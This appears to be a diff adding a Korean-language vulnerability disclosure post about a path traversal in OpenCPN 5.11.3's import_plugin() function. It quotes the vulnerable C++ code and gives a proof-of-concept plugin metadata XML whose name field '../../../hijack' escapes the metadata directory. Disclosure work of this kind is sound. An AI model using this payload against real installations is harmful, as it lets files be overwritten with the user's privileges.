@@ -1,0 +1,79 @@
+export const metadata = {
+  title: "OpenCPN File overwrite - Path traversal",
+  date: "2025-07-14 ~ 2025-07-25",
+  excerpt: "OpenCPN File overwrite - import_plugin에서의 Path traversal 취약점",
+  category: "보안",
+  imageUrl: "/images/opencpn-command-injection.png",
+  award: "",
+  hidden: true,
+};
+
+[[ENG] OpenCPN File Overwrite – Path Traversal Vulnerability in import_plugin](./opencpn-path-traversal)  
+
+**취약점 제목:**  OpenCPN File overwrite - Path traversal  
+**취약점 요약:** 파일 경로 검증 없이 .meta 파일을 생성함으로 발생하는 File Overwrite  
+**제조사:** GitHub Open Source Project  
+**소프트웨어명:** OpenCPN  
+**버전:** OpenCPN 5.11.3  
+**소프트웨어 유형:** ECS (Electronic Chart System)  
+**공격 유형:** Path Traversal  
+**영향:** 프로세스 권한의 File Overwrite  
+**취약한 파일명:** `Console.cpp`   
+**취약한 함수명:** `import_plugin()`  
+**취약한 파라미터:** `metadata_path = PluginHandler::ImportedMetadataPath(metadata.name);`  
+**취약점 발생 환경:** Ubuntu 24.04
+
+**Proof of Concept:**  
+Opencpn/cli 내의 console.cpp를 분석 중, import_plugin()에서
+
+```cpp
+void import_plugin(const std::string& tarball_path) {
+  auto handler = PluginHandler::GetInstance();
+  PluginMetadata metadata;
+  bool ok = handler->ExtractMetadata(tarball_path, metadata);
+  if (!ok) {
+    std::cerr << "Cannot extract metadata (malformed tarball?)\n";
+    exit(2);
+  }
+  if (!PluginHandler::IsCompatible(metadata)) {
+    std::cerr << "Incompatible plugin detected\n";
+    exit(2)
+  }
+  ok = handler->InstallPlugin(metadata, tarball_path);
+  if (!ok) {
+    std::cerr << "Error extracting import plugin tarball.\n";
+    exit(2);
+  }
+  metadata.is_imported = true;
+  auto metadata_path = PluginHandler::ImportedMetadataPath(metadata.name);
+  std::ofstream file(metadata_path);
+  file << metadata.to_string();
+  if (!file.good()) {
+    std::cerr << "Error saving metadata file: " << metadata_path << " for imported plugin: " << metadata.name;
+    exit(2);
+  }
+  exit(0);
+}
+```
+`metadata` 경로 검증 과정이 없는것을 확인 후 테스트해보기 위한 xml 파일을 작성
+```xml
+ <?xml version="1.0" encoding="UTF-8"?>
+ <plugin version="1">
+ <name>../../../hijack</name>
+ <version>0.0.1</version>
+ <release>0</release>
+ <summary>PoC</summary>
+ <description>Path Traversal PoC</description>
+ <target>ubuntu-x86_64</target>
+ <build-target>ubuntu</build-target>
+ <build-gtk>gtk3</build-gtk>
+ <target-version>24.04</target-version>
+ <target-arch>x86_64</target-arch>
+ <api-version>1.18</api-version>
+ <tarball-url>file:///nope</tarball-url>
+ </plugin>
+```
+`<name>` 에 ..나 /를 넣어 Path traversal 시도
+
+**취약점 기타 (파일 첨부 영상, 보고서 첨부):**  
+<Video src="/videos/opencpn-path-traversal.mp4"/>    
